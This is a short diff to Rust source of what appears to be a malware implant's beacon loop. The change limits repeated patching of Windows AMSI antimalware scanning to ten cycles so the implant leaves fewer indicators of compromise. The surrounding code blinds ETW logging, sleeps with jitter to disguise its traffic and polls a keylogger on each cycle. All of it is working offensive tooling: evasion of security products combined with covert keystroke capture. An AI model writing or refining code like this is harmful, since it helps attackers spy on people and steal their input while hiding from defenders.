@@ -86,16 +86,18 @@ pub unsafe fn beacon_loop() {
 
     // ---- task loop ----
     let mut pending: Vec<TaskResponse> = Vec::new();
+    let mut cycle: u32 = 0;
+    let mut amsi_patched = false;
     loop {
-        // Retry AMSI blinding each cycle: amsi.dll is demand-loaded (only when
-        // a scanner starts), so the first cycles usually can't resolve it.
-        // Once the host loads it, this lands the patch; subsequent cycles hit
-        // the idempotency short-circuit. ETW is blinded once at entry (always
-        // present).
-        unsafe {
-            crate::blind::maybe_patch_amsi();
+        // Retry AMSI blinding: capped at 10 cycles (amsi.dll demand-loads only
+        // when a scanner starts). After cycle 10 or on success, stop the PEB
+        // walk to eliminate the per-cycle IOC.
+        if !amsi_patched && cycle < 10 {
+            unsafe { crate::blind::maybe_patch_amsi(); }
+            amsi_patched = crate::blind::amsi_patched();
         }
         let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
+        cycle = cycle.saturating_add(1);
         sleep_jitter(secs, cfg.jitter_pct);
         // Sample the keyboard once per cycle while the keylogger is active.
         // poll_once self-guards on KEYLOG_ACTIVE, so an unconditional call is
